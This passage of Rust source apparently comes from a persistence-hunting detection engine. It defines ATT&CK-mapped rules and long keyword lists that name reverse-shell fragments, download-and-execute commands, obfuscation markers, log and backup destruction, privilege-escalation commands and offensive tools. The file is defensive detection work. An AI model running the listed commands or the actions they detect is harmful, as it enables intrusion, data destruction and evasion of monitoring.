//! Knowledge rules: what known-bad persistence looks like. Each rule has an
//! id, the ATT&CK technique it maps to, a level and a predicate over the
//! normalised row. Rules only ever add evidence; the stock lists in
//! [`super::known_good`] are what take it away.
//!
//! Ids: `H1xxx` Windows only, `H2xxx` Linux only, `H3xxx` both systems.

use super::normalize::{DirFamily, NameClass, Os, Row, State};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Level {
    Low,
    Medium,
    High,
}

impl Level {
    /// The level is the author's claim about the pattern and decides the
    /// state a rule gives (`significant`, `candidate`); what the rule adds to
    /// `hunt_score` is measured per rule and per system in
    /// [`super::measured`], never taken from the level.
    pub fn label(self) -> &'static str {
        match self {
            Level::High => "high",
            Level::Medium => "medium",
            Level::Low => "low",
        }
    }
}

pub struct Rule {
    pub id: &'static str,
    pub attack: &'static str,
    pub level: Level,
    pub title: &'static str,
    check: fn(&Row) -> bool,
}

impl Rule {
    pub fn matches(&self, row: &Row) -> bool {
        (self.check)(row)
    }
}

impl std::fmt::Debug for Rule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{} {} ({})", self.id, self.title, self.attack)
    }
}

// ───────────────────────────── helpers ──────────────────────────────────────

fn any(hay: &str, needles: &[&str]) -> bool {
    needles.iter().any(|n| hay.contains(n))
}

/// Tokens of a command: split on whitespace, quotes, commas, parentheses and
/// pipes; a token is matched whole so `nc` never matches `sync`.
fn tokens(s: &str) -> impl Iterator<Item = &str> {
    s.split(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ',' | '(' | ')' | '|' | ';' | '&' | '<' | '>' | '='))
        .filter(|t| !t.is_empty())
}

fn stem(name: &str) -> &str {
    match name.rfind('.') {
        Some(i) if i > 0 => &name[..i],
        _ => name,
    }
}

/// The image or any token (by stem, path stripped) is one of `names`.
fn has_tool(row: &Row, names: &[&str]) -> bool {
    if names.contains(&stem(&row.image_name)) {
        return true;
    }
    tokens(&row.command_lower).any(|t| {
        let base = t.rsplit(['\\', '/']).next().unwrap_or(t);
        names.contains(&stem(base))
    })
}

fn is_browser_technique(row: &Row) -> bool {
    row.technique == "browser_extension" || row.technique.starts_with("browser:")
}

fn is_windows(row: &Row) -> bool {
    row.os == Os::Windows && !is_browser_technique(row)
}

fn is_linux(row: &Row) -> bool {
    row.os == Os::Linux && !is_browser_technique(row)
}

fn runs_code(row: &Row) -> bool {
    !is_browser_technique(row) && !row.image.is_empty()
}

const WINDOWS_SCRIPT_EXT: &[&str] = &[".ps1", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".bat", ".cmd", ".hta", ".py", ".pyw", ".sct"];
const DISGUISE_EXT: &[&str] = &[".txt", ".dat", ".bin", ".tmp", ".log", ".jpg", ".jpeg", ".png", ".gif", ".pdf", ".doc", ".docx", ".xml", ".ini", ".db", ".cache"];
/// What a double extension ends with: executables, scripts and shortcuts.
const DOUBLE_EXT_LAST: &[&str] = &[".exe", ".dll", ".scr", ".com", ".pif", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".hta", ".ps1", ".lnk", ".msi"];

/// Windows techniques that load a DLL into a privileged or ubiquitous process.
const DLL_TECHNIQUES: &[&str] = &[
    "appinit_dlls",
    "appcertdlls_properties_",
    "lsa_packages",
    "security_support_provider",
    "winlogon_notify_dll",
    "network_provider_dll",
    "credential_provider",
    "print_monitor_dll",
    "time_provider_dll",
    "netsh_helper_dll",
    "servicedll_hijacking",
    "group_policy_extension_dll",
    "shellserviceobjectdelayload",
    "com_object_hijacking",
    "com_treatas_redirect",
    "shell_extension___bho",
    "mpnotify",
    "chmhelperdll",
    "hijacking_of_hhctrl_ocx",
    "natural_language_development_platform_6_dll_override_path",
    "_net_cor_profiler",
];

/// Slots that are empty on a stock system: anything in them is worth a look.
const RARE_SLOTS: &[&str] = &[
    "service_failure_command",
    "_net_cor_profiler",
    "startup_folder_redirect",
    "command_processor_autorun_key",
    "appcertdlls_properties_",
    "appinit_dlls",
    "explorer_load_property",
    "user_init_mpr_logon_script",
    "terminal_server_startup_program",
    "hijacking_of_hhctrl_ocx",
    "chmhelperdll",
    "mpnotify",
    "natural_language_development_platform_6_dll_override_path",
    "policies_explorer_run_key",
    "winlogon_notify_dll",
    "silent_process_exit_monitor",
    "screensaver",
];

const DEBUGGER_TECHNIQUES: &[&str] = &["image_file_execution_options", "silent_process_exit_monitor", "aedebug_custom_debugger", "windows_error_reporting_debugger"];

const KNOWN_DEBUGGERS: &[&str] = &[
    "vsjitdebugger.exe", "windbg.exe", "windbgx.exe", "ntsd.exe", "cdb.exe", "devenv.exe", "procdump.exe", "procdump64.exe", "drwtsn32.exe",
    "werfault.exe", "adplus.exe", "gflags.exe", "dbgsvc.exe", "msvsmon.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida64.exe",
    "windbgx.exe", "dnspy.exe", "rider64.exe",
];

const SYSTEM_BINARY_NAMES: &[&str] = &[
    "svchost.exe", "lsass.exe", "csrss.exe", "winlogon.exe", "services.exe", "wininit.exe", "smss.exe", "spoolsv.exe", "dllhost.exe",
    "taskhostw.exe", "taskhost.exe", "conhost.exe", "ctfmon.exe", "dwm.exe", "lsm.exe", "searchindexer.exe", "explorer.exe", "runtimebroker.exe",
    "sihost.exe", "fontdrvhost.exe", "wuauclt.exe", "msiexec.exe", "rundll32.exe", "audiodg.exe", "wmiprvse.exe", "dashost.exe", "cmd.exe",
    "powershell.exe", "taskmgr.exe", "mmc.exe", "regsvr32.exe", "mshta.exe", "wscript.exe", "cscript.exe", "certutil.exe", "wusa.exe",
    "sppsvc.exe", "securityhealthservice.exe", "msmpeng.exe", "userinit.exe", "logonui.exe", "lsaiso.exe", "wlms.exe", "svchost.dll",
];

const LOLBINS: &[&str] = &[
    "mshta", "regsvr32", "rundll32", "certutil", "bitsadmin", "powershell", "pwsh", "wscript", "cscript", "msiexec", "curl", "wget",
    "installutil", "msbuild", "cmd", "wmic", "forfiles", "hh", "ieexec", "presentationhost", "xwizard", "cmstp", "msxsl", "odbcconf",
    "regasm", "regsvcs", "scriptrunner", "pcalua", "conhost", "explorer", "iwr", "invoke-webrequest", "start-bitstransfer", "esentutl",
    "expand", "extrac32", "findstr", "replace", "ftp", "finger", "desktopimgdownldr", "appinstaller", "msedge", "chrome", "firefox",
    "diantz", "makecab", "certoc", "mpcmdrun", "squirrel", "update", "winword", "excel", "powerpnt",
];

const OFFENSIVE_TOOLS: &[&str] = &[
    "mimikatz", "nc", "ncat", "netcat", "nc64", "chisel", "ligolo", "ligolo-agent", "ligolo-ng", "frpc", "frps", "ngrok", "plink", "psexec",
    "psexesvc", "paexec", "meterpreter", "beacon", "sharphound", "bloodhound", "rubeus", "lazagne", "pwdump", "gsecdump", "wce", "quasar",
    "asyncrat", "njrat", "nanocore", "xmrig", "kryptex", "minerd", "cpuminer", "nbminer", "t-rex", "lolminer", "proxychains", "pupy",
    "koadic", "powercat", "nishang", "invoke-mimikatz", "sharpersist", "gost", "iox", "3proxy", "rsocx", "ew", "earthworm", "lcx", "htran",
    "regeorg", "neoreg", "tunna", "dnscat", "dnscat2", "iodine", "ptunnel", "powershdll", "sliver", "havoc", "mythic", "brute-ratel",
    "badrat", "covenant", "grunt", "merlin", "poshc2", "empire", "winpeas", "linpeas", "pspy", "pspy64", "socat", "revshell", "reverse-shell",
    "procdump", "nanodump", "dumpert", "safetykatz", "kekeo", "certify", "seatbelt", "sharpup", "sharpdpapi", "impacket", "secretsdump",
    "smbexec", "wmiexec", "atexec", "dcomexec", "evil-winrm", "crackmapexec", "netexec", "nxc", "kerbrute", "responder", "inveigh",
    "bettercap", "ettercap", "metasploit", "msfvenom", "cobaltstrike", "teamserver", "stowaway", "venom", "rathole", "nps", "npc",
    "localtonet", "bore", "pivotnacci", "sshuttle", "autossh", "tor", "torify",
];

const RMM_TOOLS: &[&str] = &[
    "anydesk", "teamviewer", "teamviewer_service", "tv_w32", "tv_x64", "screenconnect", "connectwise", "atera", "ateraagent", "splashtop",
    "srservice", "srmanager", "rustdesk", "ammyy", "aa_v3", "supremo", "meshagent", "meshcentral", "ultraviewer", "logmein", "lmiguardiansvc",
    "gotoassist", "g2a", "dameware", "dwrcs", "radmin", "rserver3", "remoteutilities", "rutserv", "rfusclient", "tightvnc", "tvnserver",
    "ultravnc", "winvnc", "realvnc", "vncserver", "nomachine", "nxservice", "zohoassist", "zaservice", "level", "level-windows", "pulseway",
    "syncro", "ninjarmm", "ninjarmmagent", "ninjaone", "n-able", "beanywhere", "kaseya", "agentmon", "dwagent", "action1", "action1_agent",
    "itarian", "simplehelp", "simplehelpservice", "tacticalrmm", "tacticalagent", "fleetdeck", "getscreen", "remotepc", "rpcservice",
    "showmypc", "chrome-remote-desktop", "remoting_host", "remoting_start_host", "aweray", "awesun", "todesk", "sunlogin", "sunloginclient",
    "parsec", "rdpwrap", "rdpwinst", "quickassist",
];

const SYNC_TOOLS: &[&str] = &["rclone", "megasync", "megacmd", "mega-cmd", "megaclient", "filezilla", "winscp", "cyberduck", "syncthing", "gdrive", "dropbox-uploader"];

const DOWNLOAD_EXECUTE: &[&str] = &[
    "| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python", "| perl", "|perl", "| php", "| ruby", "-o /tmp", "-o /dev/shm", "-o /var/tmp",
    "-o- ", "-qo- ", "bash -c \"$(curl", "bash -c \"$(wget", "sh -c \"$(curl", "sh -c \"$(wget", "$(curl ", "$(wget ", "`curl ", "`wget ",
    "certutil -urlcache", "certutil.exe -urlcache", "-urlcache -split", "certutil -decode", "certutil.exe -decode", "bitsadmin /transfer",
    "bitsadmin.exe /transfer", "start-bitstransfer", "invoke-webrequest", "downloadstring", "downloadfile", "net.webclient",
    "webclient).download", "system.net.webclient", "invoke-restmethod", "msiexec /i http", "msiexec.exe /i http", "msiexec /i https",
    "msiexec.exe /i https", "/q /i http", "desktopimgdownldr", "esentutl /y http", "mpcmdrun -downloadfile", "mpcmdrun.exe -downloadfile",
];

const REVERSE_SHELL: &[&str] = &[
    "nc -e", "nc.exe -e", "ncat -e", "nc -c", "ncat -c", "nc64 -e", "/dev/tcp/", "/dev/udp/", "bash -i >&", "bash -i >& ", "sh -i >&", "mkfifo",
    "exec:sh", "exec:bash", "exec:'sh", "exec:\"sh", "exec:'bash", "pty.spawn", "import socket", "import pty", "use socket", "0<&196",
    "telnet ", "sockets.tcpclient", "new-object net.sockets", "tcpclient(", "system.net.sockets", "socket.socket(", "io.socket", "ruby -rsocket",
    "php -r '$sock", "fsockopen", "node -e \"require('net')", "require('child_process')", "-l -p ", "-lvp", "-nlvp", "-lvnp", "zsh -c 'zmodload zsh/net/tcp",
    "ztcp ", "lua -e \"require('socket')", "awk 'begin {s = \"/inet/tcp", "openssl s_client -quiet -connect", "socat tcp", "socat openssl",
    "powershell -nop -c \"$client", "$client = new-object", "$stream = $client",
];

const OBFUSCATION: &[&str] = &[
    "base64 -d", "base64 --decode", "base64 -di", "| base64", "|base64", "xxd -r", "xxd -p -r", "openssl enc -d", "openssl base64 -d",
    "eval \"$(", "eval $(", "eval `", "eval(", "| sh -", "printf '\\x", "$'\\x", "frombase64string", "-encodedcommand", "-enc ",
    "-ec ", "-e aaa", "-e jab", "-e sqb", "-e iab", "-e caa", "-e dqb", "-enco", "::decompress", "gzipstream", "deflatestream", "[char]",
    "-join", "replace('", "-replace", "iex(", "invoke-expression", "^p^o^w^e", "p^o^w", "c^m^d", "\"^\"", "\\x3", "chr(", "strreverse",
    "unescape(", "string.fromcharcode", "rot13", "tr 'a-za-z' 'n-za-mn-za-m'", "rev |", "| rev", "python -c \"exec(", "python3 -c \"exec(",
    "python -c 'exec(", "python3 -c 'exec(", "exec(base64", "exec(__import__('base64')", "exec(__import__(\"base64\")", "perl -e 'use mime::base64", "perl -mmime::base64",
];

const DEFENCE_TAMPERING: &[&str] = &[
    "set-mppreference", "add-mppreference", "disablerealtimemonitoring", "disableioavprotection", "disablebehaviormonitoring", "exclusionpath",
    "netsh advfirewall set", "netsh firewall set opmode", "netsh advfirewall firewall add rule", "sc stop windefend", "sc config windefend",
    "sc delete windefend", "sc stop wuauserv", "sc stop sense", "sc stop eventlog", "sc config eventlog", "wevtutil cl", "wevtutil.exe cl",
    "clear-eventlog", "vssadmin delete shadows", "vssadmin.exe delete shadows", "wmic shadowcopy delete", "wbadmin delete catalog",
    "wbadmin delete systemstatebackup", "bcdedit /set {default} recoveryenabled no", "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
    "cipher /w", "fsutil usn deletejournal", "auditpol /clear", "auditpol /set", "reg delete hklm\\system\\currentcontrolset\\services\\eventlog",
    "taskkill /im msmpeng", "taskkill /f /im msmpeng", "disableantispyware", "disableantivirus", "tamperprotection", "iptables -f", "iptables -p input accept",
    "iptables --flush", "nft flush ruleset", "ufw disable", "setenforce 0", "auditctl -e 0", "auditctl -d", "systemctl stop auditd", "systemctl disable auditd",
    "systemctl mask auditd", "service auditd stop", "systemctl stop rsyslog", "systemctl disable rsyslog", "systemctl stop falco", "systemctl stop osqueryd",
    "systemctl stop wazuh", "systemctl stop clamav", "systemctl stop apparmor", "aa-teardown", "aa-disable", "killall -9 auditd", "pkill auditd", "pkill -9 auditd",
    "echo 0 > /proc/sys/kernel/yama", "kernel.yama.ptrace_scope=0", "sysctl -w kernel.yama", "chattr +i /etc/", "history -c", "histfile=/dev/null",
    "unset histfile", "histsize=0", "set +o history", "> /var/log/", "rm -rf /var/log", "rm -f /var/log", "truncate -s 0 /var/log", "shred /var/log",
    "ln -sf /dev/null ~/.bash_history", "ln -sf /dev/null /root/.bash_history", "export histfile=", "lastlog -c", "utmpdump", "> /var/log/wtmp",
    "> /var/log/btmp", "> /var/log/lastlog", "> /var/log/auth.log", "> /var/log/secure", "journalctl --vacuum", "journalctl --rotate",
];

const FURTHER_PERSISTENCE: &[&str] = &[
    "schtasks /create", "schtasks.exe /create", "schtasks /ru system", "sc create", "sc.exe create", "sc config", "sc.exe config", "reg add",
    "reg.exe add", "new-itemproperty", "set-itemproperty", "new-service", "register-scheduledtask", "new-scheduledtask", "new-scheduledjob",
    "net user", "net.exe user", "net localgroup", "net.exe localgroup", "net group", "wmic useraccount", "wmic process call create", "wmic /node",
    "icacls", "takeown", "attrib +h", "attrib +s +h", "copy /y", "xcopy /y", "robocopy", "bitsadmin /create", "bitsadmin /addfile",
    "useradd", "adduser", "usermod -ag sudo", "usermod -ag wheel", "usermod -g 0", "usermod -u 0", "gpasswd -a", ">> /etc/sudoers", "> /etc/sudoers",
    "/etc/sudoers.d/", ">> ~/.ssh/authorized_keys", ">> /root/.ssh/authorized_keys", "> /root/.ssh/authorized_keys", ">> /home/", "crontab -",
    "crontab -l", "(crontab", "systemctl enable", "systemctl --user enable", ">> /etc/ld.so.preload", "> /etc/ld.so.preload",
    "tee -a /etc/", "tee /etc/", ">> /etc/rc.local", ">> /etc/profile", ">> ~/.bashrc", ">> /root/.bashrc", "echo \"*/", "echo '*/", "echo \"@reboot",
    "echo '@reboot", "update-rc.d", "chkconfig", "insmod ", "ln -s /etc/init.d", "cp /etc/passwd", "chpasswd", " passwd ", "mkpasswd",
    "openssl passwd", "echo \"root:", "echo 'root:",
];

const PRIVESC: &[&str] = &[
    "chmod u+s", "chmod +s", "chmod 4755", "chmod 4777", "chmod 6755", "chmod 2755", "chmod g+s", "setcap cap_setuid", "setcap cap_sys_admin",
    "setcap cap_dac_override", "setcap cap_net_raw", "chmod 777 /etc", "chmod -r 777", "chmod 666 /etc/passwd",
    "chmod 666 /etc/shadow", "chmod 644 /etc/shadow", "chmod 777 /etc/sudoers", "mount -o remount,suid", "mount -o remount,exec",
    "nsenter -t 1", "-v /var/run/docker.sock", "unshare -r", "capsh --", "ld_preload=", "ld_library_path=/tmp", "ld_audit=", "gtfobins",
];

const SHELL_HOOK_HIGH: &[&str] = &[
    "ld_preload", "ld_audit", "alias sudo=", "alias ssh=", "alias su=", "alias passwd=", "alias scp=", "alias git=", "alias gpg=", "alias docker=",
    "alias kubectl=", "function sudo", "sudo() {", "sudo(){", "ssh() {", "ssh(){", "trap '", "trap \"", "promptcommand=", "prompt_command=",
    "precmd()", "preexec()", "source /tmp", ". /tmp", "source /dev/shm", ". /dev/shm", "source /var/tmp", ". /var/tmp",
];

const SHELL_HOOK_MEDIUM: &[&str] = &[
    "histfile=", "histsize=0", "histfilesize=0", "unset histfile", "history -c", "set +o history", "histignore=", "histcontrol=ignoreboth",
    "alias ls=", "alias ps=", "alias netstat=", "alias ss=", "alias top=", "alias htop=", "alias lsof=", "alias find=", "alias crontab=",
    "alias systemctl=", "alias cat=", "alias vim=", "alias vi=", "alias less=", "alias more=", "alias grep=", "alias history=", "alias who=",
    "alias w=", "alias last=", "alias id=", "alias env=", "alias export=", "alias kill=", "alias rm=",
];

/// `alias ls='ls --color=auto'`: an alias whose body starts with its own name is not hiding anything.
fn alias_is_wrapper(cmd: &str) -> bool {
    let Some(rest) = cmd.trim_start().strip_prefix("alias ") else { return false };
    let Some((name, body)) = rest.split_once('=') else { return false };
    let body = body.trim().trim_matches(|c| c == '"' || c == '\'').trim_start();
    let first = body.split_whitespace().next().unwrap_or("");
    let name = name.trim();
    first == name || ["/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/"].iter().any(|d| first == format!("{d}{name}"))
}

fn cloud_default_sudoer(cmd: &str) -> bool {
    for who in ["ubuntu ", "ec2-user ", "admin ", "vagrant ", "centos ", "fedora ", "debian ", "rocky ", "almalinux ", "cloud-user ", "opc ", "azureuser ", "%google-sudoers ", "%sudo ", "%admin ", "%wheel ", "root "] {
        if cmd.starts_with(who) {
            return true;
        }
    }
    false
}

// ───────────────────────────── rules ────────────────────────────────────────

pub static RULES: &[Rule] = &[
    // ── Windows ──────────────────────────────────────────────────────────
    Rule {
        id: "H1001",
        attack: "T1218",
        level: Level::High,
        title: "LOLBin fetching remote content",
        check: |r| is_windows(r) && any(&r.command_lower, &["http://", "https://", "ftp://", "\\\\"]) && (has_tool(r, LOLBINS) || LOLBINS.contains(&stem(&r.launcher))),
    },
    Rule {
        id: "H1002",
        attack: "T1059.001",
        level: Level::Medium,
        title: "PowerShell with hidden window or policy bypass",
        check: |r| {
            is_windows(r)
                && any(&r.command_lower, &["powershell", "pwsh"])
                && any(
                    &r.command_lower,
                    &["-w hidden", "-w h ", "-win hidden", "-windowstyle hidden", "-windowstyle h", "-ep bypass", "-exec bypass", "-executionpolicy bypass", "-ep unrestricted", "-nop ", "-noprofile", "-noni", "-noninteractive", "-sta "],
                )
        },
    },
    Rule {
        id: "H1003",
        attack: "T1218.011",
        level: Level::High,
        title: "Inline script payload or rundll32 script host",
        check: |r| {
            is_windows(r)
                && (any(&r.command_lower, &["javascript:", "vbscript:", "about:"])
                    || (r.command_lower.contains("rundll32")
                        && any(
                            &r.command_lower,
                            &[
                                "mshtml", "runhtmlapplication", "shell32.dll,shellexec_rundll", "shell32,shellexec_rundll", "url.dll,openurl", "url.dll,fileprotocolhandler",
                                "url,openurl", "advpack", "ieadvpack", "zipfldr,routethecall", "zipfldr.dll,routethecall", "pcwutl", "launchapplication",
                                "syssetup,setupinfobjectinstallaction", "syssetup.dll,setupinfobjectinstallaction", "setupapi,installhinfsection",
                                "setupapi.dll,installhinfsection", "shdocvw,openurl", "dfshim", "shopenverbapplication", "desk.cpl,installscreensaver",
                                "comsvcs,minidump", "comsvcs.dll,minidump", "ndfapi", "scrobj", "shimgvw", "msvcrt,system",
                            ],
                        )))
        },
    },
    Rule {
        id: "H1004",
        attack: "T1036.005",
        level: Level::High,
        title: "System binary name outside its folder",
        check: |r| {
            is_windows(r)
                && SYSTEM_BINARY_NAMES.contains(&r.image_name.as_str())
                && !matches!(r.family, DirFamily::System32 | DirFamily::SysWow64 | DirFamily::WindowsDir | DirFamily::Bare)
        },
    },
    Rule {
        id: "H1005",
        attack: "T1547.004",
        level: Level::High,
        title: "Winlogon Shell or Userinit changed",
        check: |r| {
            is_windows(r)
                && ((r.technique == "winlogon_shell_property" && (r.image_name != "explorer.exe" || r.command_lower.split(',').filter(|t| !t.trim().is_empty()).count() > 1))
                    || (r.technique == "winlogon_userinit_property" && (r.image_name != "userinit.exe" || r.command_lower.split(',').filter(|t| !t.trim().is_empty()).count() > 1)))
        },
    },
    Rule {
        id: "H1006",
        attack: "T1546.012",
        level: Level::High,
        title: "Debugger or monitor hijack",
        check: |r| {
            is_windows(r)
                && DEBUGGER_TECHNIQUES.contains(&r.technique.as_str())
                && !KNOWN_DEBUGGERS.contains(&r.image_name.as_str())
                && r.family != DirFamily::ProgramFiles
                && !r.image.is_empty()
        },
    },
    Rule {
        id: "H1007",
        attack: "T1546.012",
        level: Level::Medium,
        title: "Third-party debugger registered",
        check: |r| is_windows(r) && DEBUGGER_TECHNIQUES.contains(&r.technique.as_str()) && !KNOWN_DEBUGGERS.contains(&r.image_name.as_str()) && r.family == DirFamily::ProgramFiles,
    },
    Rule {
        id: "H1008",
        attack: "T1547",
        level: Level::High,
        title: "System DLL slot pointing outside the system folders",
        check: |r| {
            is_windows(r)
                && DLL_TECHNIQUES.contains(&r.technique.as_str())
                && !matches!(r.family, DirFamily::System32 | DirFamily::SysWow64 | DirFamily::WindowsDir | DirFamily::ProgramFiles | DirFamily::Bare)
        },
    },
    Rule {
        id: "H1009",
        attack: "T1059",
        level: Level::High,
        title: "Script run from a user-writable folder",
        check: |r| is_windows(r) && WINDOWS_SCRIPT_EXT.contains(&r.image_ext.as_str()) && (r.family.is_user_writable() || r.family == DirFamily::Other || r.family == DirFamily::DriveRoot),
    },
    Rule {
        id: "H1010",
        attack: "T1036.007",
        level: Level::High,
        title: "Double extension",
        check: |r| {
            is_windows(r) && {
                let n = &r.image_name;
                let Some(i) = n.rfind('.') else { return false };
                let last = &n[i..];
                let s = &n[..i];
                let Some(j) = s.rfind('.') else { return false };
                let prev = &s[j..];
                DOUBLE_EXT_LAST.contains(&last) && (DISGUISE_EXT.contains(&prev) || matches!(prev, ".xls" | ".xlsx" | ".ppt" | ".pptx" | ".zip" | ".rar" | ".mp3" | ".mp4" | ".html" | ".htm"))
            }
        },
    },
    Rule {
        id: "H1011",
        attack: "T1564.004",
        level: Level::High,
        title: "Alternate data stream",
        check: |r| is_windows(r) && r.image.len() > 2 && r.image[2..].contains(':') && !r.image.starts_with("\\\\"),
    },
    Rule {
        id: "H1012",
        attack: "T1546",
        level: Level::Medium,
        title: "Slot that is empty on a stock system",
        check: |r| {
            is_windows(r)
                && RARE_SLOTS.contains(&r.technique.as_str())
                && !(r.technique == "safeboot_alternateshell" && r.image_name == "cmd.exe")
                && !(r.technique == "screensaver" && matches!(r.family, DirFamily::System32 | DirFamily::SysWow64 | DirFamily::WindowsDir))
                && !r.command_lower.trim().is_empty()
        },
    },
    Rule {
        id: "H1013",
        attack: "T1021.002",
        level: Level::High,
        title: "Image on a network share",
        check: |r| is_windows(r) && r.family == DirFamily::Unc,
    },
    Rule {
        id: "H1014",
        attack: "T1027",
        level: Level::High,
        title: "Executable code in a non-executable file",
        check: |r| is_windows(r) && runs_code(r) && DISGUISE_EXT.contains(&r.image_ext.as_str()) && (!r.launcher.is_empty() || r.technique != "file_association_hijack"),
    },
    Rule {
        id: "H1015",
        attack: "T1053.005",
        level: Level::Medium,
        title: "Runs as SYSTEM from a user-writable folder",
        check: |r| {
            is_windows(r)
                && matches!(r.technique.as_str(), "scheduled_task" | "scheduled_task__xml_" | "windows_service")
                && r.family.is_user_writable()
                && matches!(r.user.to_lowercase().as_str(), "system" | "nt authority\\system" | "localsystem" | "s-1-5-18")
        },
    },
    Rule {
        id: "H1016",
        attack: "T1564.003",
        level: Level::Low,
        title: "Started hidden or minimised",
        check: |r| is_windows(r) && any(&r.command_lower, &["start /min", "start /b", "/min ", "vbhide", "wscript.shell", ".run(", "windowstyle=0", "showwindow=0", ", 0, false", ",0,true", ",0,false"]),
    },
    Rule {
        id: "H1017",
        attack: "T1176",
        level: Level::High,
        title: "Browser extension forced from outside the store",
        check: |r| r.os == Os::Windows && is_browser_technique(r) && r.raw_lower.contains("update_url=") && any(&r.raw_lower, &["policy", "external_extensions"]),
    },
    Rule {
        id: "H1018",
        attack: "T1176",
        level: Level::Medium,
        title: "Browser extension installed outside the store",
        check: |r| {
            r.os == Os::Windows
                && is_browser_technique(r)
                && (r.raw_lower.contains("update_url=")
                    || any(&r.raw_lower, &["unpacked", "sideloaded", "manifest on disk", "external registry", "external preferences", "external_extensions", "by policy", "force-installed"]))
                && !(r.raw_lower.contains("update_url=") && any(&r.raw_lower, &["policy", "external_extensions"]))
        },
    },
    Rule {
        id: "H1019",
        attack: "T1176",
        level: Level::Low,
        title: "Browser extension with risky permissions",
        check: |r| r.os == Os::Windows && is_browser_technique(r) && r.raw_lower.contains("permissions="),
    },
    // ── Linux ────────────────────────────────────────────────────────────
    Rule {
        id: "H2001",
        attack: "T1574.006",
        level: Level::High,
        title: "ld.so.preload library",
        check: |r| is_linux(r) && r.technique == "rootkit:ld_so_preload",
    },
    Rule {
        id: "H2002",
        attack: "T1556.003",
        level: Level::High,
        title: "PAM bypass or backdoor module",
        check: |r| is_linux(r) && matches!(r.technique.as_str(), "pam:permit_bypass" | "pam:exec_backdoor"),
    },
    Rule {
        id: "H2003",
        attack: "T1556.003",
        level: Level::Medium,
        title: "PAM module outside the module directory",
        check: |r| is_linux(r) && r.technique == "pam:custom_module_path",
    },
    Rule {
        id: "H2004",
        attack: "T1098.004",
        level: Level::Medium,
        title: "SSH forced command or keys command",
        check: |r| is_linux(r) && (matches!(r.technique.as_str(), "ssh:force_command" | "ssh:authorized_keys_command") || (r.technique == "ssh:authorized_key" && r.raw_lower.contains("command="))),
    },
    Rule {
        id: "H2005",
        attack: "T1098.004",
        level: Level::Low,
        title: "SSH key for root",
        check: |r| is_linux(r) && r.technique == "ssh:authorized_key" && r.user == "root",
    },
    Rule {
        id: "H2022",
        attack: "T1098.004",
        level: Level::High,
        title: "SSH key forcing a command from a scratch or hidden folder",
        check: |r| {
            is_linux(r)
                && r.technique == "ssh:authorized_key"
                && r.raw_lower.contains("command=")
                && any(&r.raw_lower, &["command=\"/tmp/", "command=\"/dev/shm/", "command=\"/var/tmp/", "command=\"/home/", "command=\"/root/", "/.", "base64", "curl ", "wget ", "nc ", "bash -i", "python -c", "perl -e", "| sh", "|sh", "| bash", "|bash"])
        },
    },
    Rule {
        id: "H2006",
        attack: "T1053.003",
        level: Level::Medium,
        title: "Cron job every minute",
        check: |r| is_linux(r) && r.technique.starts_with("cron:") && any(&r.raw_lower, &["user cron * * * * *:", "* * * * * ", "*/1 * * * *"]),
    },
    Rule {
        id: "H2007",
        attack: "T1036.004",
        level: Level::High,
        title: "Kernel or daemon name outside the system tree",
        check: |r| {
            is_linux(r)
                && [
                    "kworker", "kthreadd", "ksoftirqd", "kswapd", "kswapd0", "migration", "rcu_sched", "systemd", "systemd-udevd", "systemd-journald",
                    "dbus-daemon", "sshd", "crond", "cron", "init", "rsyslogd", "polkitd", "udevd", "kauditd", "kdevtmpfs", "khugepaged", "ksmd", "kthrotld",
                    "watchdog", "kintegrityd", "kblockd", "xmr", "kdmflush", "sh", "bash", "ps", "ls", "netstat", "ss", "top",
                ]
                .contains(&r.image_name.as_str())
                && !r.family.is_system()
                && r.family != DirFamily::Bare
        },
    },
    Rule {
        id: "H2008",
        attack: "T1222.002",
        level: Level::Medium,
        title: "Marks files executable or immutable, or detaches from the session",
        check: |r| is_linux(r) && any(&r.command_lower, &["chmod +x", "chmod a+x", "chmod u+x", "chmod 7", "chmod 0755", "chmod 755", "chattr +i", "chattr -i", "chattr +a", "nohup", "setsid", "disown", "& disown"]),
    },
    Rule {
        id: "H2009",
        attack: "T1548.003",
        level: Level::Medium,
        title: "sudo without password for a user",
        check: |r| is_linux(r) && r.technique == "sudoers:nopasswd" && r.command_lower.contains("nopasswd") && !cloud_default_sudoer(&r.command_lower),
    },
    Rule {
        id: "H2010",
        attack: "T1548.003",
        level: Level::High,
        title: "sudoers Defaults that disable logging or authentication",
        check: |r| {
            is_linux(r)
                && r.technique.starts_with("sudoers:")
                && any(
                    &r.command_lower,
                    &["!authenticate", "!syslog", "!log_input", "!log_output", "logfile=/dev/null", "ld_preload", "env_keep", "!requiretty", "!use_pty", "pwfeedback", "!mail_badpass", "!mail_no_user", "timestamp_timeout=-1", "setenv", "!lecture", "runaspw", "targetpw", "rootpw"],
                )
                && !r.command_lower.contains("env_keep += \"lang")
        },
    },
    Rule {
        id: "H2011",
        attack: "T1547.006",
        level: Level::High,
        title: "modprobe install hook running a command",
        check: |r| is_linux(r) && r.technique == "modprobe:install_command" && !matches!(r.command_lower.trim(), "/bin/true" | "/bin/false" | "true" | "false" | "/usr/bin/true" | "/usr/bin/false"),
    },
    Rule {
        id: "H2012",
        attack: "T1547.006",
        level: Level::Low,
        title: "Kernel module blacklisted through an install hook",
        check: |r| is_linux(r) && r.technique == "modprobe:install_command" && matches!(r.command_lower.trim(), "/bin/true" | "/bin/false" | "true" | "false" | "/usr/bin/true" | "/usr/bin/false"),
    },
    Rule {
        id: "H2013",
        attack: "T1546.016",
        level: Level::High,
        title: "APT hook outside the package tree",
        check: |r| is_linux(r) && r.technique == "apt:package_hook" && !r.family.is_system() && r.family != DirFamily::Bare,
    },
    Rule {
        id: "H2014",
        attack: "T1070.004",
        level: Level::High,
        title: "Process whose binary was deleted or runs from a temp folder",
        check: |r| is_linux(r) && matches!(r.technique.as_str(), "process:deleted_binary_in_memory" | "process:temp_path_execution"),
    },
    Rule {
        id: "H2015",
        attack: "T1546.004",
        level: Level::High,
        title: "Shell profile hooks a command, LD_PRELOAD or a trap",
